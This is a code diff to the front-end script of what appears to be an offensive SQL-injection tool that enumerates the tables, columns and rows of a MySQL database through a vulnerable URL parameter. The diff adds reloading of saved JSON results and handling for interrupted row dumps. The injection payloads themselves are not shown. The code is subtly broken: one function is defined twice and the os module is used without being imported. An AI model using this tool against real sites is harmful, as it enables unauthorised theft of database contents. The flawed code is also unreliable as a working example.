@@ -18,9 +18,11 @@
 # If not, see <https://www.gnu.org/licenses/>
 
 import argparse
+import sys
 from MySQLEnum import *
 from Formatting import *
 from builtins import input
+import json
 
 
 def show_banner():
@@ -56,11 +58,39 @@ def construct_data(post_args, vuln_field):
     if vuln_field not in retval:
         
         print(clr.red("\n[!]") + "Vulnerable field '{}' not found in provided post arguments... exiting\n".format(vuln_field))
-        exit(0)
+        exit(1)
     
     return retval
 
+def show_enum_rows_option(target, keyinterrupt=False):
+    
+    msg = "1-Enumerate rows? [y/n, default:n]: "
+    
+    if keyinterrupt == True:
+        
+        msg = "\n\n2-Enumerate rows for another table? [y/n, default:n]: "
+    
+    
+    enum_rows = input(msg)
+        
+    if enum_rows == "y":
+        
+        while True:
+        
+            enumerate_rows(target)
+                
+            again = input("3-Enumerate rows for another table? [y/n, default:n]: ")
+                
+            if again == "n":
+                
+                break
+    else:
+        
+        exit(0)
+
 def enumerate_rows(target):
+
+    enumerated_rows = []
     
     selected_table = select_table(target.DB)
     
@@ -72,9 +102,27 @@ def enumerate_rows(target):
     
     print("\nColumn selected: {}\n".format(clr.red(selected_col)))
     
-    rows = target.get_rows(selected_col, selected_table, selected_limit)
+    print("\nEnumerating rows for {}.{}\n".format(clr.red(selected_table), clr.red(selected_col)))
     
-    print(render_rows(rows,selected_col))
+    try:
+        
+        rows = target.generate_rows(selected_col, selected_table, selected_limit)
+        
+        for row in rows:
+            
+            enumerated_rows.append(row)
+            
+        print(render_rows(enumerated_rows,selected_col))
+            
+        
+    except KeyboardInterrupt:
+    
+        print("\n4-Row enumeration aborted, partial enumeration results for {}.{}:\n".format(clr.red(selected_table),clr.red(selected_col)))
+        
+        print(render_rows(enumerated_rows,selected_col))
+        
+        show_enum_rows_option(target, keyinterrupt=True)
+    
 
 def select_row_limit(db, selected_table):
     
@@ -101,15 +149,16 @@ def select_row_limit(db, selected_table):
 
 def select_col(db, selected_table):
     
-    cols = db['tables'][selected_table]["cols"]
+    cols = db['tables'][selected_table]['cols']
+    total_cols = int(db['tables'][selected_table]['col_count'])
     
     print(render_cols(cols))
     
     while True:
     
-        col_index = int(input("Select Column to enumerate [{}-{}]: ".format("1",len(cols))))
+        col_index = int(input("Select Column to enumerate [{}-{}]: ".format("1",total_cols)))
         
-        if col_index in list(range(1,len(cols)+1)):
+        if col_index > 0 and col_index <= total_cols:
         
             break
             
@@ -122,19 +171,39 @@ def select_table(db):
     print(render_tables(db))
         
     tables = db['tables']
+    total_tables = int(db['info']['table_count'])
         
     while True:
     
-        table_index = int(input("Select Table [{}-{}]: ".format("1",len(tables))))
+        table_index = int(input("Select Table [{}-{}]: ".format("1",total_tables)))
         
-        if table_index in list(range(1,len(tables)+1)):
+        print("table_index : {}".format(table_index))
+        
+        if table_index > 0 and table_index <=  total_tables:
         
             break
     
     selected_table = list(tables.keys())[int(table_index)-1]
     
     return selected_table
+
+def get_file_name(url):
     
+    file = url.split('/')[2]
+        
+    return open ('./{}.json'.format(file), 'w')
+
+def get_file_name(url):
+    
+    return './{}.json'.format(url.split('/')[2])
+
+def show_results(target):
+    
+    print_db_info(target.DB, format="table")
+       
+    print(clr.yellow("\nENUMERATED TABLES FOR: {}\n".format(clr.red(target.DB['params']['url']))))
+    
+    print_table_info(target.DB, format="table")
 
 def start(url=None,
             data=None,
@@ -142,7 +211,42 @@ def start(url=None,
             table_limit=None,
             debug=None,
             terminator=None,
-            request_type=None):
+            request_type=None,
+            file_read=None):
+            
+    
+    if file_read:
+        
+        file_name = get_file_name(url)
+        
+        if os.path.isfile(file_name):
+            
+            with open(file_name, 'r') as f:
+                db = json.load(f)
+                
+            target = MYSQLENUM(target_url=db['params']['url'],
+                        data=db['params']['data'],
+                        vuln_field=db['params']['vuln_field'],
+                        table_limit=db['params']['limit'],
+                        debug=db['params']['debug'],
+                        request_type=db['params']['request_type'],
+                        terminator=db['params']['terminator']
+                        )
+                        
+            target.DB['tables'] = db['tables']
+            target.DB['info'] = db['info']
+            target.DB['date'] = db['date']
+            target.DB['params'] = target.get_params()
+            
+            show_results(target)
+            show_enum_rows_option(target)
+            
+                
+        else:
+            
+            print(clr.red("\n[!]") + "File '{}' not found for URL: {}\n   Exiting ...\n".format(file_name,url))
+            exit(1)
+        
     
     
     data = construct_data(data, vuln_field)
@@ -159,29 +263,9 @@ def start(url=None,
                         )
     target.enumerate()
     
-    print_db_info(target.DB, format="table")
-       
-    print(clr.yellow("\nENUMERATED TABLES FOR: {}\n".format(clr.red(target.DB['url']))))
+    show_results(target)
     
-    print_table_info(target.DB, format="table")
-    
-    enum_rows = input("Enumerate rows? [y/n, default:n]: ")
-        
-    if enum_rows == "y":
-        
-        while True:
-        
-            enumerate_rows(target)
-                
-            again = input("Enumerate rows for another table? [y/n, default:n]: ")
-                
-            if again == "n":
-                
-                break
-            
-            
-        
-    
+    show_enum_rows_option(target)
     
     
 
@@ -190,23 +274,34 @@ if __name__ == '__main__':
     show_banner()
 
     parser = argparse.ArgumentParser()
+    
+    parser.add_argument("-f","--file_read", help="Read in previously enumerated file", action="store_true")
+    
     parser.add_argument("-debug","--debug", help="Show debug messages : Use d=DEBUG, w=WARNING, i=INFO, e=ERROR, c=CRITICAL")
+    
     parser.add_argument("-u","--url", help="Full path to the vulnerable URL", required=True)
-    parser.add_argument("-r","--request_type", help="Request type get=GET, post=POST", required=True)
-    parser.add_argument("-d","--data", help="Data parameters in the format 'parameter1:value1,parameter2:value2...'", required=True)
-    parser.add_argument("-v","--vuln_field", help="Vulnerable parameter from the data provided in the -d switch", required=True)
+    
+    parser.add_argument("-r","--request_type", help="Request type get=GET, post=POST", required='-f' not in sys.argv)
+    
+    parser.add_argument("-d","--data", help="Data parameters in the format 'parameter1:value1,parameter2:value2...'", required='-f' not in sys.argv)
+    
+    parser.add_argument("-v","--vuln_field", help="Vulnerable parameter from the data provided in the -d switch", required='-f' not in sys.argv)
+    
     parser.add_argument("-limit","--table_limit", help="Limit the number of tables to be enumerated")
-    parser.add_argument("-t","--terminator", help="The string to be appended at the end of the injected query, that will comment out rest of the part after the injected query", required=True)
+    
+    parser.add_argument("-t","--terminator", help="The string to be appended at the end of the injected query, that will comment out rest of the part after the injected query", required='-f' not in sys.argv)
+    
     args = parser.parse_args()
     
-    
-    if args.request_type not in ['get','post']:
-        
-        parser.error("Invalid request type: Use get=GET, post=POST")
-        
-    if (args.debug is not None) and (args.debug not in ['w','i','d','e','c']):
-        
-        parser.error("Invalid debug level setting: Use d=DEBUG, w=WARNING, i=INFO, e=ERROR, c=CRITICAL")
+    if '-f' not in sys.argv:
+
+        if args.request_type not in ['get','post']:
+            
+            parser.error("Invalid request type: Use get=GET, post=POST")
+            
+        if (args.debug is not None) and (args.debug not in ['w','i','d','e','c']):
+            
+            parser.error("Invalid debug level setting: Use d=DEBUG, w=WARNING, i=INFO, e=ERROR, c=CRITICAL")
         
         
     
@@ -216,5 +311,6 @@ if __name__ == '__main__':
         table_limit=args.table_limit,
         debug=args.debug,
         terminator=args.terminator,
-        request_type=args.request_type)
+        request_type=args.request_type,
+        file_read=args.file_read)
 
